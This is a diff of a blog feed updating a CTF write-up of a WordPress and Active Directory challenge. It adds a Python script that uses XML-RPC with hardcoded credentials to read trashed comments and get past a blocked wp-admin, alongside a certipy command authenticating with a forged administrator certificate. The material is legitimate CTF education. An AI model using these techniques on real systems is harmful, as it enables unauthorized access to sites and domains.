@@ -3,7 +3,7 @@
 &lt;p>This weekend I had some fun participating in the P3RF3CTR00T CTF 2024 by &lt;a href="https://twitter.com/p3rf3ctr00t" target="_blank" rel="noopener">p3rf3ctr00t&lt;/a>
 ctf team, barely got some sleep. They really did a good job considering it&amp;rsquo;s their first edition of the CTF, I didn&amp;rsquo;t experience any downtime and support was very helpful on their discord server. They had over 50 challenges!&lt;/p>
 &lt;p>Kudos to them, I am happy to see an evolution of CTFs in the Kenyan hacking scene. I have been playing CTFs for a while and this one gave me a fun challenge, at some point I was number 1. I was playing solo under &lt;strong>NoPwnNoGain&lt;/strong>.&lt;/p>
-&lt;p>Alright, let&amp;rsquo;s get into the writeup. The AD category was a challenge to everyone, even after 24 hrs I was the only solver.&lt;/p>
+&lt;p>Alright, let&amp;rsquo;s get into the writeup. The AD category was a challenge to everyone, even after 24 hrs I was the only solver. Later, on there were additional solves but no one else got DA :).&lt;/p>
 &lt;h2 id="attack">Attack&lt;/h2>
 &lt;p>We start of with the challenge information. Important info here is the IP and the Artifact.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_1.png" class="center" style="border-radius: 8px;" />
@@ -114,7 +114,53 @@ ctf team, barely got some sleep. They really did a good job considering it&amp;r
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q certipy auth -pfx administrator_dc.pfx -dc-ip 94.72.112.254
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_29.png" class="center" style="border-radius: 8px;" />
-&lt;p>Flag: &lt;code>r00t{C3rtificate_f0r_grandline_wh4t_a_j0ke_I_can_for9e}&lt;/code>&lt;/p></content></item><item><title>Vulnhub: Lemon Squeezy 1</title><link>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</link><pubDate>Tue, 13 Apr 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon.png" class="center" style="border-radius: 8px;" />
+&lt;p>Flag: &lt;code>r00t{C3rtificate_f0r_grandline_wh4t_a_j0ke_I_can_for9e}&lt;/code>&lt;/p>
+&lt;h2 id="extras">Extras&lt;/h2>
+&lt;p>After finishing the CTF, I got this idea. Since I was playing around with xmlrpc, could we have just accessed the comment in trash using xmlrpc? Then we don&amp;rsquo;t need to struggle with the 403 bypass. Even though xmlrpc functionality is limited. It can pretty much read most of the things on wordpress.&lt;/p>
+&lt;p>ChatGPT for the win. ChatGPT wrote for me this python script that I could use to read the hidden comment and flag. Awesome!&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> xmlrpc.client
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># WordPress site XML-RPC URL&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wp_url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://154.12.228.253/xmlrpc.php&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># WordPress login credentials&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wp_username &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;crocodile&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wp_password &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Winterseason1234&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Create the XML-RPC client&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>client &lt;span style="color:#f92672">=&lt;/span> xmlrpc&lt;span style="color:#f92672">.&lt;/span>client&lt;span style="color:#f92672">.&lt;/span>ServerProxy(wp_url)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Define the parameters to get comments in the trash&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>comment_filter &lt;span style="color:#f92672">=&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;status&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;trash&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># Filter comments with status &amp;#39;trash&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Call the wp.getComments method&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">try&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> comments &lt;span style="color:#f92672">=&lt;/span> client&lt;span style="color:#f92672">.&lt;/span>wp&lt;span style="color:#f92672">.&lt;/span>getComments(&lt;span style="color:#ae81ff">0&lt;/span>, wp_username, wp_password, comment_filter)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Check if any comments are found&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> comments:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Comments in Trash:&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> comment &lt;span style="color:#f92672">in&lt;/span> comments:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;ID: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;comment_id&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Post ID: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;post_id&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Author: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;author&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Content: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;content&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Date: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;date_created_gmt&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;-&amp;#34;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">40&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;No comments found in the trash.&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">except&lt;/span> xmlrpc&lt;span style="color:#f92672">.&lt;/span>client&lt;span style="color:#f92672">.&lt;/span>Fault &lt;span style="color:#66d9ef">as&lt;/span> e:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Error occurred: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>e&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_30.png" class="center" style="border-radius: 8px;" />
+&lt;p>I&amp;rsquo;m not sure the author knew this was possible. This is a clear indication that blocking access to the wp-admin portal doesn&amp;rsquo;t really fully protect the wordpress instance, xmlrpc has some useful functionality! This is if you have valid credentials. Most online resources around attacking wordpress using xmlrpc don&amp;rsquo;t really cover this.&lt;/p>
+&lt;p>There is potential to write an enum script that goes through xmlrpc if wp-admin is blocked. I hope you the reader can look into it. I surely will.&lt;/p>
+&lt;p>It tried using wp-json but I didn&amp;rsquo;t succeed.&lt;/p>
+&lt;h2 id="conclusion">Conclusion&lt;/h2>
+&lt;p>This was good challenge, cheers to the author &lt;a href="https://x.com/byronchris25" target="_blank" rel="noopener">Winter&lt;/a>
+. Thanks for reading to the end!&lt;/p></content></item><item><title>Vulnhub: Lemon Squeezy 1</title><link>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</link><pubDate>Tue, 13 Apr 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/lemonsqueezy1/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon.png" class="center" style="border-radius: 8px;" />
 &lt;table>
 &lt;thead>
 &lt;tr>
